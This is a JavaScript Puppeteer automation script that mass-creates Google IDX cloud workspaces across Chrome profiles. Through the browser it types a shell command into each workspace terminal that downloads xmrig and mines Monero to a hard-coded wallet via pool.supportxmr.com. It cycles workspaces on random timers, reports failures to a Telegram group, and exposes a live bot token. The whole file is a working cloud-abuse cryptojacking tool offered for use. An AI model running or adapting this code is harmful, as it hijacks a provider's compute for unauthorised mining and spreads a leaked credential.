const puppeteer = require('puppeteer');
const { exec } = require('child_process');

const wait = (min, maxPlus) => new Promise(resolve => setTimeout(resolve, (min + maxPlus * Math.random()) * 1000))

async function waitForClassToExist(page, classSelector, maxWaitTimeMs = 5 * 60 * 1000, checkIntervalMs = 10 * 1000) {
    console.log(`Starting to wait for class '${classSelector}' to appear...`);
    const startTime = Date.now();

    let classFound = false;
    while (!classFound && (Date.now() - startTime < maxWaitTimeMs)) {
        try {
            // Check if the element exists and is visible
            const element = await page.$(classSelector);
            if (element) {
                const isVisible = await page.evaluate((el) => {
                    const style = window.getComputedStyle(el);
                    return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
                }, element);

                if (isVisible) {
                    classFound = true;
                    console.log(`Found element with class '${classSelector}' after ${Math.round((Date.now() - startTime) / 1000)} seconds`);
                    return true;
                }
            }
            // Wait before checking again
            console.log(`Class '${classSelector}' not found yet, checking again in ${checkIntervalMs / 1000} seconds...`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        } catch (error) {
            console.log(`Error while checking for class: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        }
    }

    if (!classFound) {
        console.log(`Timed out waiting for class '${classSelector}' after ${maxWaitTimeMs / 1000} seconds`);
    }
    return false;
}

const runCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }
}


const clickElementInIframe = async (page, iframeSelector = 'iframe', elementSelector) => {
    try {
        // Wait for iframe to be available
        await page.waitForSelector(iframeSelector);

        // Get the iframe element
        const frameElement = await page.$(iframeSelector);
        if (!frameElement) {
            console.log('Iframe not found');
            return false;
        }

        // Get the content frame
        const frame = await frameElement.contentFrame();
        if (!frame) {
            console.log('Could not access iframe content');
            return false;
        }

        // Wait for the element in the iframe to be available
        await frame.waitForSelector(elementSelector);

        // Click the element
        await frame.click(elementSelector);
        console.log(`Successfully clicked element "${elementSelector}" inside iframe`);
        return true;
    } catch (error) {
        console.error(`Error clicking element in iframe: ${error.message}`);
        return false;
    }
}
const clickCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.waitForSelector('iframe.is-loaded');
    await page.click('iframe.is-loaded');

    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
    await page.keyboard.press('Enter');
    await new Promise(resolve => setTimeout(resolve, 1000));
}


const initConnection = async (port, name = new Date().valueOf()) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com/new/react-native');


    console.log('New tab opened in existing Chrome!');
    await page.waitForSelector('#mat-input-0');

    // Type text into the input with ID mat-input-0
    await page.type('#mat-input-0', name);


    await page.keyboard.press('Enter');
    // Wait for 2 seconds before pressing Enter
    // await page.waitForTimeout(2000); 
    await new Promise(resolve => setTimeout(resolve, 1000));

    const currentUrl = await page.url();
    console.log('Current URL path:', currentUrl);
    return page;
}

const openOldConnection = async (port) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com');

    // Wait for selector to ensure the page is loaded
    await page.waitForSelector('.main-target', { timeout: 22 * 1000 }).catch(() => {
        return { browser, page, mainTargetLinks: [] };
    });

    // Get list of <a> tags with ID/class main-target and their href values
    const mainTargetLinks = await page.evaluate(() => {
        const classElements = document.querySelectorAll('a.main-target');
        const allElements = Array.from(classElements);
        return allElements.map(el => ({ href: el.href }));
    });
    console.log('Found <a> tags with main-target:', mainTargetLinks);
    return { browser, page, mainTargetLinks };
}
const runRestartScript = (script) => {
    return new Promise((resolve, reject) => {
        exec(script, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error running restart script: ${error.message}`);
                reject(error);
            } else {
                console.log('Restart script executed successfully');
                if (stdout) console.log(`stdout: ${stdout}`);
                if (stderr) console.warn(`stderr: ${stderr}`);
                resolve();
            }
        });
    });
}
const openChrome = async (port, profilePath) => {
    let remoteDebugCmd = ''
    if (process.platform === 'win32') {
        const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
        // const profilePath = path.resolve(__dirname, 'profile', profile);
        remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
    } else {
        const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
        // const profilePath = path.join(__dirname, 'profile', profile);
        remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
    }
    return new Promise((resolve, reject) => {
        console.log('Executing:', remoteDebugCmd);
        exec(remoteDebugCmd, (error) => {
            if (error) {
                console.error(`Error launching Chrome: ${error.message}`);
                reject(error);
            } else {
                console.log('Chrome launched with remote debugging');
                resolve();
            }
            console.log('Chrome launched with remote debugging');
        });
    });
}

const hoverOnElement = async (page, selector) => {
    try {
        // Wait for the element to be present in the DOM
        await page.waitForSelector(selector, { timeout: 10000 });

        // Hover on the element
        await page.hover(selector);

        console.log(`Successfully hovered on element: ${selector}`);
        return true;
    } catch (error) {
        console.error(`Error hovering on ${selector}: ${error.message}`);
        return false;
    }
};

const openTerminal = async (page) => {
    try {
        await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
        await page.waitForSelector('.monaco-highlighted-label', { timeout: 100 * 1000 });
        await page.click('.menubar-menu-button');
        await page.waitForSelector('div.menubar-menu-items-holder', { timeout: 500000 });
        await page.waitForSelector('.action-label[aria-label="Terminal"]', { timeout: 500000 });
        await page.click('.action-label[aria-label="Terminal"]');
        await page.waitForSelector('.action-label[aria-label="New Terminal"]', { timeout: 500000 });
        const child = await page.$('.action-label[aria-label="New Terminal"]');
        const parent = await child.evaluateHandle(el => el.parentElement.parentElement);
        const parentElement = parent.asElement();
        if (parentElement) {
            await parentElement.click({ delay: 100 });
        } else {
            console.error('Parent element not found or not an ElementHandle');
        }
        console.log('__________________Clicked on "New Terminal"');
        await new Promise(resolve => setTimeout(resolve, 1 * 1000));
    } catch (error) {
        console.error(`Error opening terminal: ${error.message}`);
    }
}
const runCMD1 = async (page, name) => {
    await page.waitForSelector('.xterm-helper-textarea', { timeout: 100 * 1000 });
    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
    await page.focus('.xterm-helper-textarea');
    await page.type('.xterm-helper-textarea', textToType);
    await page.evaluate(() => {
        const textarea = document.querySelector('.xterm-helper-textarea');
        const event = new KeyboardEvent('keydown', {
            key: 'Enter',
            code: 'Enter',
            keyCode: 13,
            which: 13,
            bubbles: true
        });
        textarea.dispatchEvent(event);
    });
    await page.focus('.xterm-helper-textarea');
    await page.keyboard.press('Enter');
    await new Promise(resolve => setTimeout(resolve, 10 * 1000));
    console.log('Pressed Enter in terminal');
}

const resetWithLink = async (page, link, name) => {
    await page.goto(link);
    await wait(2, 3);//new Promise(resolve => setTimeout(resolve, (2 + 3 * Math.random()) * 1000));
    await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
    await page.waitForSelector('.monaco-highlighted-label', { timeout: 100 * 1000 });
    //  clear the terminal
    for (let i = 0; i < 2; i++) {
        try {
            const id = `#list_id_1_${0}`;
            await hoverOnElement(page, id);
            await page.waitForSelector(`${id} li:nth-of-type(2)`, { timeout: 500 });
            await page.click(`${id} li:nth-of-type(2)`);
        } catch (error) {
            console.error(`Error clicking on element: ${error.message}`);
        }
    }
    await openTerminal(page);
    await runCMD1(page, name);

    // const commands = [
    //     "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
    //     " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
    //     " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
    //     " && cd xmrig-6.22.2",
    //     " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    // ];

    // for (const cmd of commands) {
    //     await new Promise(resolve => setTimeout(resolve, 100));
    //     // await page.keyboard.type(cmd);
    //     await page.type('.xterm-helper-textarea', cmd);
    //     // Small delay between chunks to ensure proper typing
    // }

    // await page.evaluate(() => {
    //     const textarea = document.querySelector('.xterm-helper-textarea');
    //     const event = new KeyboardEvent('keydown', {
    //         key: 'Enter',
    //         code: 'Enter',
    //         keyCode: 13,
    //         which: 13,
    //         bubbles: true
    //     });
    //     textarea.dispatchEvent(event);
    // });

    // await new Promise(resolve => setTimeout(resolve, 2 * 1000));
}



const killChromeProcess = (name) => {
    return new Promise((res, rej) => {
        if (process.platform === 'win32') {
            return exec('taskkill /IM chrome.exe /F', () => res());
        } else {
            return exec('killall "Google Chrome"', () => res());
        }
    })
};
const closeAllTabs = async (browser, saveOne = false) => {
    try {
        // Get all pages (tabs) in the browser
        const all = await browser.pages();
        all.reverse();
        const [first, ...pages] = all;
        console.log(`Closing ${pages.length} tabs...`);
        if (!saveOne && first) {
            await first.close().catch();
        }
        if (pages && pages.length > 0) {
            // Close each page
            for (const page of pages) {
                await page.close().catch(err => {
                    console.log(`Error closing tab: ${err.message}`);
                });
            }
        }

        console.log('All tabs closed successfully');
        return true;
    } catch (error) {
        console.error(`Error closing tabs: ${error.message}`);
        return false;
    }
};
const axios = require('axios');

async function sendTelegramMessage(botToken, chatId, message) {
    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (response.data && response.data.ok) {
            console.log('Message sent to Telegram successfully');
            return true;
        } else {
            console.error('Failed to send Telegram message:', response.data);
            return false;
        }
    } catch (error) {
        console.error('Error sending Telegram message:', error.message);
        return false;
    }
}

// =====================================
// run.js

// Define your bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7668129713:AAGGfomtEre-W2QH0r1FUPL1Z9pKSd0KMlQ';
// const TELEGRAM_CHAT_ID = '1140704410';
const TELEGRAM_CHAT_ID = '-4750007696'; // group chat id

const reset = async (browser, link) => {
    try {
        const location = link.split('/');
        const workerName = location[location.length - 1];
        const page = await browser.newPage();

        await page.goto(link);
        await page.waitForSelector('iframe.is-loaded', { timeout: 8 * 60 * 1000 });

        const iframeSrc = await page.evaluate(() => {
            const iframe = document.querySelector('iframe.is-loaded');
            return iframe ? iframe.src : null;
        });
        console.log('open workerName:', workerName);
        await resetWithLink(page, iframeSrc, workerName).catch(async (err) => {
            console.error('Error resetting with link::________________dnd____', err);
            await resetWithLink(page, iframeSrc, workerName).catch()
        });
        console.log(workerName + 'done and closing page in 10 seconds');
        setTimeout(async () => {
            await page.close();
            console.log(workerName + '_________closed___');
        }, (4 * Math.random() + 6) * 60 * 1000);
    } catch (error) {
        console.error('Error killing Chrome:', error);
    }
}

const create = async (page, name) => {
    try {
        await page.goto('https://idx.google.com/new/react-native');
        await page.waitForSelector('#mat-input-0');
        await page.type('#mat-input-0', name);
        await page.keyboard.press('Enter');
        await page.waitForSelector('iframe.is-loaded', { timeout: 30 * 1000 });
        await page.close();
    } catch (error) {
        console.error('Error Create:', error);
        throw new Error('Error Create:', error);
    }
}
const checkDie = async (page, port, name) => {
    try {
        console.log('Checking for errors... die');
        await page.waitForSelector('.error-section.callout.severity-error.is-loud', { timeout: 10 * 1000 });
        const errorMessage = await page.evaluate(() => {
            const errorSection = document.querySelector('.error-section.callout.severity-error.is-loud');
            if (errorSection) {
                console.log('Error section found:');
                const pTag = errorSection.querySelector('p');
                return pTag ? pTag.textContent : null;
            }
            return null;
        });

        if (errorMessage) {
            console.log('Error message:', errorMessage);
            await sendTelegramMessage(
                TELEGRAM_BOT_TOKEN,
                TELEGRAM_CHAT_ID,
                `Máy #_${name}_# số ${+port - 9220} ⚠️ Error detected: ${errorMessage}`
            );
            return true;
        }
    } catch (error) {
        console.error('Error in checkDie:', error);
        return null
    }
}
const runJob = async (port, name) => {
    try {
        const { browser, page, mainTargetLinks } = await openOldConnection(port);
        if (mainTargetLinks.length < 10) {
            for (let i = mainTargetLinks.length; i < 10; i++) {
                await create(page, `${name}-${i}-`);
            }
        }

        await closeAllTabs(browser, true)
        // reset
        mainTargetLinks.reverse();
        // open link for what ?
        // for (const link of mainTargetLinks) {
        //     console.log('open link:', link.href);
        //     await page.goto(link.href);
        //     await new Promise(resolve => setTimeout(resolve, 10 * 1000));
        //     const isDie = await checkDie(page, port, name);
        //     if (isDie) {
        //         await closeAllTabs(browser)
        //         console.log('isDie:', isDie);
        //         throw new Error('isDie');
        //     }
        // }
        // page.close();
        console.log('open link: check die');
        const link = mainTargetLinks[0];
        await page.goto(link.href);
        const isDie = await checkDie(page, port, name);
        if (isDie) {
            await closeAllTabs(browser)
            console.log('isDie:', isDie);
            throw new Error('isDie');
        }
        await page.close();
        for (const link of mainTargetLinks) {
            await reset(browser, link.href).catch(() => reset(browser, link.href).catch());
        }
        await closeAllTabs(browser)
    } catch (error) {
        console.error('Error in runJob:', error);
        throw new Error(error);
    }
}
const combineOpenReset = async (port, name, profilePath) => {
    return new Promise((resolve, reject) => {
        openChrome(port, profilePath)
        setTimeout(() => {
            console.log('_____________________________combineOpenReset with port:', port);
            runJob(port, name).finally(() => {
                resolve();
            })
        }, 2000);
    });
}

module.exports = {
    openChrome,
    initConnection,
    runCMD,
    waitForClassToExist,
    openOldConnection,
    clickCMD,
    runRestartScript,
    resetWithLink,
    killChromeProcess,
    sendTelegramMessage,
    closeAllTabs,
    combineOpenReset,
}
